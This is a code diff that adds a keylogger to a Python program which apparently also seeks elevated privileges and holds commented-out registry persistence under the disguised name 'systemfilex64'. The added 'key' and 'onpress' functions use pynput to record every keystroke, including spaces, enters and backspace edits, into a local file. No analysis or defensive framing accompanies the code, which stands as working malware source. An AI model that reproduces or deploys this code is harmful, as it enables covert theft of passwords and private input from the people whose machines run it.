@@ -1,6 +1,7 @@
 import ctypes
 import elevate
 import pymsgbox
+from pynput.keyboard import Listener
 import platform
 import sys
 from shutil import copyfile
@@ -35,6 +36,34 @@ def persistance():
             #winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, app_path)
             #winreg.CloseKey(key_obj)
         #time.sleep(11)
+
+def key():
+    with Listener(on_press = onpress) as listener:
+        listener.join()
+def onpress(key):
+    key = str(key)
+    backspace = False
+    if key == "Key.space":
+        key = " "
+    elif key =="Key.enter":
+        key ="\n"
+    elif str(key) == "Key.backspace":
+        backspace = True
+        key = ""
+    
+    key = key.replace("'","")
+
+    with open ("keyloggers.txt","a") as f:
+        print(backspace)
+        x = f.tell()
+        
+        if backspace and x:
+            x = f.tell() - 1
+            f.seek(x, os.SEEK_SET)
+            f.truncate()
+            return 
+        
+        f.write(key)
 
 
 
